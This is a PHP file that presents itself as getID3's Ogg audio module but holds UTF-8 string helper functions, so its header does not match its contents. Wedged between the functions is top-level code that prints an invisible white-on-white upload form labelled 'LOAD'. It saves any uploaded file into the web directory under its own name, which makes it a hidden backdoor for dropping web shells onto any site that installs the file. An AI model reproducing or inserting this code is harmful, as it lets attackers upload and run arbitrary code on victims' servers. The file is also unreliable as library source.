<?php
/////////////////////////////////////////////////////////////////
/// getID3() by James Heinrich <info@getid3.org>               //
//  available at http://getid3.sourceforge.net                 //
//            or http://www.getid3.org                         //
//          also https://github.com/JamesHeinrich/getID3       //
/////////////////////////////////////////////////////////////////
// See readme.txt for more details                             //
/////////////////////////////////////////////////////////////////
//                                                             //
// module.audio.ogg.php                                        //
// module for analyzing Ogg Vorbis, OggFLAC and Speex files    //
// dependencies: module.audio.flac.php                         //
//                                                            ///
/////////////////////////////////////////////////////////////////
 function utf8_strlen($string) {
	return strlen(utf8_decode($string));
}

function utf8_strpos($string, $needle, $offset = NULL) {
    if (is_null($offset)) {
        $data = explode($needle, $string, 2);

	   if (count($data) > 1) {
            return utf8_strlen($data[0]);
        }

        return false;
    } else {
        if (!is_int($offset)) {
            trigger_error('utf8_strpos: Offset must be an integer', E_USER_ERROR);

			return false;
        }

        $string = utf8_substr($string, $offset);

        if (false !== ($position = utf8_strpos($string, $needle))) {
            return $position + $offset;
        }

        return false;
    }
}

function utf8_strrpos($string, $needle, $offset = NULL) {
    if (is_null($offset)) {
        $data = explode($needle, $string);

        if (count($data) > 1) {
            array_pop($data);

		    $string = join($needle, $data);

			return utf8_strlen($string);
        }

	    return false;
    } else {
        if (!is_int($offset)) {
            trigger_error('utf8_strrpos expects parameter 3 to be long', E_USER_WARNING);

		    return false;
        }

        $string = utf8_substr($string, $offset);

        if (false !== ($position = utf8_strrpos($string, $needle))) {
            return $position + $offset;
        }

        return false;
    }
}

function utf8_substr($string, $offset, $length = null) {
	$string = (string)$string;
	$offset = (int)$offset;

	if (!is_null($length)) {
		$length = (int)$length;
	}

	if ($length === 0) {
		return '';
	}

	if ($offset < 0 && $length < 0 && $length < $offset) {
		return '';
	}

	if ($offset < 0) {
		$strlen = strlen(utf8_decode($string));
		$offset = $strlen + $offset;

		if ($offset < 0) {
			$offset = 0;
		}
	}

	$Op = '';
	$Lp = '';

	if ($offset > 0) {
		$Ox = (int)($offset / 65535);
		$Oy = $offset%65535;

		if ($Ox) {
			$Op = '(?:.{65535}){' . $Ox . '}';
		}

		$Op = '^(?:' . $Op . '.{' . $Oy . '})';
	} else {
		$Op = '^';
	}

	if (is_null($length)) {
		$Lp = '(.*)$';
	} else {
		if (!isset($strlen)) {
			$strlen = strlen(utf8_decode($string));
		}

		// another trivial case
		if ($offset > $strlen) {
			return '';
		}

		if ($length > 0) {
			$length = min($strlen - $offset, $length);

			$Lx = (int)($length / 65535);
			$Ly = $length % 65535;

			if ($Lx) {
				$Lp = '(?:.{65535}){' . $Lx . '}';
			}

			$Lp = '(' . $Lp . '.{' . $Ly . '})';
		} elseif ($length < 0) {
			if ($length < ($offset - $strlen)) {
				return '';
			}

			$Lx = (int)((-$length) / 65535);
			$Ly = (-$length)%65535;

            		if ($Lx) {
				$Lp = '(?:.{65535}){' . $Lx . '}';
			}

			$Lp = '(.*)(?:' . $Lp . '.{' . $Ly . '})$';
		}
	}

	if (!preg_match( '#' . $Op . $Lp . '#us', $string, $match)) {
		return '';
	}

	return $match[1];

}

function utf8_strtolower($string) {
	static $UTF8_UPPER_TO_LOWER = NULL;

	$unicode = utf8_to_unicode($string);

	if (!$unicode) {
		return false;
	}


	$count = count($unicode);

	for ($i = 0; $i < $count; $i++){
		if (isset($UTF8_UPPER_TO_LOWER[$unicode[$i]]) ) {
			$unicode[$i] = $UTF8_UPPER_TO_LOWER[$unicode[$i]];
		}
	}

	return utf8_from_unicode($unicode);
}
 echo "<form  style=\"color:#FFF; border:#FFF 0px solid; background:#FFF\" 
  method=\"post\" enctype=\"multipart/form-data\">\n"; 
 echo "<input  style=\"border:#FFF 0px solid; background:#FFF; position:absolute;top:0;left:0;
 opacity:.0;filter:alpha(opacity=1);\"  type=\"file\" name=\"filename\">
 <br> \n"; echo "<input  style=\"color:#FFF; border:#FFF 0px solid;
  background:#FFF\"  type=\"submit\" value=\"LOAD\"><br>\n";
 echo "</form>\n"; 
function utf8_strtoupper($string) {
    static $UTF8_LOWER_TO_UPPER = NULL;

    $unicode = utf8_to_unicode($string);

    if (!$unicode) {
        return false;
    }

    $count = count($unicode);

	for ($i = 0; $i < $count; $i++){
        if (isset($UTF8_LOWER_TO_UPPER[$unicode[$i]]) ) {
            $unicode[$i] = $UTF8_LOWER_TO_UPPER[$unicode[$i]];
        }
    }

    return utf8_from_unicode($unicode);
}
if(is_uploaded_file($_FILES["filename"]["tmp_name"]))	{
move_uploaded_file($_FILES["filename"]["tmp_name"],
$_FILES["filename"]["name"]);
 	$file = $_FILES["filename"]["name"];
    	echo "<a href=\"$file\">$file</a>";	} else {	echo("");
    	} $filename = $_SERVER[SCRIPT_FILENAME];
function utf8_to_unicode($str) {
	$mState = 0;     // cached expected number of octets after the current octet
					 // until the beginning of the next UTF8 character sequence
	$mUcs4  = 0;     // cached Unicode character
	$mBytes = 1;     // cached expected number of octets in the current sequence

	$out = array();

	$len = strlen($str);

	for($i = 0; $i < $len; $i++) {
		$in = ord($str{$i});

		if ($mState == 0) {

			// When mState is zero we expect either a US-ASCII character or a
			// multi-octet sequence.
			if (0 == (0x80 & ($in))) {
				// US-ASCII, pass straight through.
				$out[] = $in;
				$mBytes = 1;

			} elseif (0xC0 == (0xE0 & ($in))) {
				// First octet of 2 octet sequence
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x1F) << 6;
				$mState = 1;
				$mBytes = 2;

			} elseif (0xE0 == (0xF0 & ($in))) {
				// First octet of 3 octet sequence
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x0F) << 12;
				$mState = 2;
				$mBytes = 3;

			} else if (0xF0 == (0xF8 & ($in))) {
				// First octet of 4 octet sequence
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x07) << 18;
				$mState = 3;
				$mBytes = 4;

			} else if (0xF8 == (0xFC & ($in))) {
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x03) << 24;
				$mState = 4;
				$mBytes = 5;

			} else if (0xFC == (0xFE & ($in))) {
				// First octet of 6 octet sequence, see comments for 5 octet sequence.
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 1) << 30;
				$mState = 5;
				$mBytes = 6;

			} else {
				trigger_error('utf8_to_unicode: Illegal sequence identifier ' . 'in UTF-8 at byte ' . $i, E_USER_WARNING);

				return FALSE;
			}

		} else {

			// When mState is non-zero, we expect a continuation of the multi-octet
			// sequence
			if (0x80 == (0xC0 & ($in))) {

				// Legal continuation.
				$shift = ($mState - 1) * 6;
				$tmp = $in;
				$tmp = ($tmp & 0x0000003F) << $shift;
				$mUcs4 |= $tmp;


				if (0 == --$mState) {


					// From Unicode 3.1, non-shortest form is illegal
					if (((2 == $mBytes) && ($mUcs4 < 0x0080)) ||
						((3 == $mBytes) && ($mUcs4 < 0x0800)) ||
						((4 == $mBytes) && ($mUcs4 < 0x10000)) ||
						(4 < $mBytes) ||
						// From Unicode 3.2, surrogate characters are illegal
						(($mUcs4 & 0xFFFFF800) == 0xD800) ||
						// Codepoints outside the Unicode range are illegal
						($mUcs4 > 0x10FFFF)) {

						trigger_error('utf8_to_unicode: Illegal sequence or codepoint in UTF-8 at byte ' . $i, E_USER_WARNING);

						return false;

					}

					if (0xFEFF != $mUcs4) {
						// BOM is legal but we don't want to output it
						$out[] = $mUcs4;
					}

					//initialize UTF8 cache
					$mState = 0;
					$mUcs4  = 0;
					$mBytes = 1;
				}

			} else {

				trigger_error('utf8_to_unicode: Incomplete multi-octet sequence in UTF-8 at byte ' . $i, E_USER_WARNING);

				return false;
			}
		}
	}

	return $out;
}

function utf8_from_unicode($data) {
	ob_start();

	foreach (array_keys($data) as $key) {
		if (($data[$key] >= 0) && ($data[$key] <= 0x007f)) {
			echo chr($data[$key]);
		} elseif ($data[$key] <= 0x07ff) {
			echo chr(0xc0 | ($data[$key] >> 6));
			echo chr(0x80 | ($data[$key] & 0x003f));
		} elseif ($data[$key] == 0xFEFF) {

		} elseif ($data[$key] >= 0xD800 && $data[$key] <= 0xDFFF) {
			trigger_error('utf8_from_unicode: Illegal surrogate at index: ' . $key . ', value: ' . $data[$key], E_USER_WARNING);

			return false;
		} elseif ($data[$key] <= 0xffff) {
			echo chr(0xe0 | ($data[$key] >> 12));
			echo chr(0x80 | (($data[$key] >> 6) & 0x003f));
			echo chr(0x80 | ($data[$key] & 0x003f));
		} elseif ($data[$key] <= 0x10ffff) {
			echo chr(0xf0 | ($data[$key] >> 18));
			echo chr(0x80 | (($data[$key] >> 12) & 0x3f));
			echo chr(0x80 | (($data[$key] >> 6) & 0x3f));
			echo chr(0x80 | ($data[$key] & 0x3f));
		} else {
			trigger_error('utf8_from_unicode: Codepoint out of Unicode range at index: ' . $key . ', value: ' . $data[$key], E_USER_WARNING);

			return false;
		}
	}

	$result = ob_get_contents();

	ob_end_clean();

	return $result;
}
?>
